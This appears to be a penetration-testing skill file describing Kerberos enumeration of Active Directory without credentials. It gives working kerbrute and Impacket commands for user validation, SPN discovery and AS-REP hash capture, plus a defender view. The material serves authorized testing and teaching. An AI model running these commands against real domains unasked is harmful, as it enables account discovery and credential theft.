---
name: kerberos-enum
description: Use when enumerating Active Directory through Kerberos on an
  authorized engagement without needing credentials first. Covers user
  enumeration via Kerberos responses, SPN discovery, AS-REP roastable
  account detection, and ticket policy review. Use when you have network
  access but no credentials yet, when building the target user list, or
  when checking Kerberos configuration weaknesses.
version: 1.0.0
domain: ad
lifecycle: stable
last_verified: 2026-10-23
parent: ad-enumeration
requires: [ad-enumeration]
extends: []
relates: [kerberoasting, ldap-enumeration]
tools:
  - name: Impacket
    version: 0.11.0
  - name: Python
    version: 3.12
---

Kerberos leaks information before authentication: the KDC's error
responses distinguish valid from invalid users, and service principal
names are enumerable. This skill covers credential-free Kerberos
enumeration on authorized engagements: validating usernames, finding
SPNs, and spotting accounts configured for AS-REP roasting. It is the
pre-authentication recon that feeds kerberoasting and password attacks.

## Quick Workflow

1. Confirm the KDC is reachable on port 88.
2. Enumerate valid usernames through Kerberos error responses.
3. Discover SPNs for later kerberoasting.
4. Identify accounts with Kerberos pre-authentication disabled.
5. Review ticket policies (lifetime, encryption types) for weaknesses.
6. Feed validated users to password-spraying and kerberoasting phases.

## 1. User enumeration without credentials

```bash
# kerbrute: fast username validation via KDC responses
kerbrute userenum -d corp.example --dc 10.0.5.10 /tmp/userlist.txt \
  -o /tmp/valid_users.txt

# Impacket alternative: GetNPUsers doubles as a validator when
# pre-auth is enabled (valid users get further in the exchange)
python3 /opt/impacket/examples/GetNPUsers.py corp.example/ \
  -dc-ip 10.0.5.10 -usersfile /tmp/userlist.txt 2>&1 | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN' | head -20
```

A KDC that answers differently for valid versus invalid principals gives
you the user list for free. Validate the list twice: false positives
waste the spraying phase, false negatives miss targets.

## 2. SPN and pre-auth discovery

```bash
# With any valid credential, list SPNs (kerberoasting targets)
python3 /opt/impacket/examples/GetUserSPNs.py corp.example/testuser:'TestPass123!' \
  -dc-ip 10.0.5.10 -request 2>&1 | head -20

# Without credentials, probe for AS-REP roastable accounts
python3 /opt/impacket/examples/GetNPUsers.py corp.example/ \
  -dc-ip 10.0.5.10 -usersfile /tmp/valid_users.txt -format hashcat \
  -outputfile /tmp/asrep.txt
# Any hash in asrep.txt is an account with pre-auth disabled: crackable offline

# Check supported encryption types (weak etypes are a finding)
python3 - <<'EOF'
# Review: look for RC4 (etype 23) still enabled domain-wide,
# which keeps kerberoasting and overpass attacks practical
print("Check: Get-DomainPolicy Kerberos settings on a domain-joined host")
EOF
```

Accounts with pre-authentication disabled are the highest-value find in
this phase: no password needed to get a crackable hash. Report each one
individually.

## 3. Ticket policy review

```powershell
# From a domain-joined host with any domain user context
Get-ADDefaultDomainPasswordPolicy | Select-Object MaxTicketAge, MaxRenewAge
# Long ticket lifetimes widen the window for stolen-ticket reuse

# Check for unconstrained delegation while enumerating (feeds later phases)
# via LDAP: userAccountControl flag TRUSTED_FOR_DELEGATION
```

Weak encryption types and long lifetimes are configuration findings even
before any exploitation. Note them for the report's hardening section.

## Edge cases

- The KDC rate-limits enumeration. Slow down, use smaller batches, and
  resume; aggressive kerbrute can look like a password attack.
- Pre-auth disabled accounts return no hash. Some configurations error
  differently; verify with a second tool before ruling it out.
- The domain uses read-only DCs or trusts. Enumerate each domain in the
  trust separately; users do not span trusts automatically.
- IPv6 or alternate KDC addresses answer differently. Enumerate all DC
  IPs from DNS, not just the first.

## Escalation

- Valid users plus weak passwords suspected: hand the list to
  password-spraying with the engagement's timing rules.
- SPNs found: hand them to kerberoast-execution for ticket cracking.
- AS-REP hashes captured: crack them as in dictionary-attacks, then use
  the credentials to start authenticated enumeration.

## Detection and defender view

Defenders see Kerberos enumeration as bursts of AS-REQ packets with
invalid principals, pre-auth failures, and TGS requests for many SPNs
from one source. Good detection is KDC log analytics on failure
patterns. Defenses are enabling pre-authentication on every account
(no exceptions), disabling RC4 etypes, monitoring for enumeration
bursts, and treating service accounts as high-value targets with strong
random passwords.

## Key references

- MITRE ATT&CK T1087.002 (Account Discovery: Domain Account).
- MITRE ATT&CK T1558.004 (Steal or Forge Kerberos Tickets: AS-REP
  Roasting).
- CWE-287 (Improper Authentication).
- Impacket GetNPUsers and GetUserSPNs documentation.
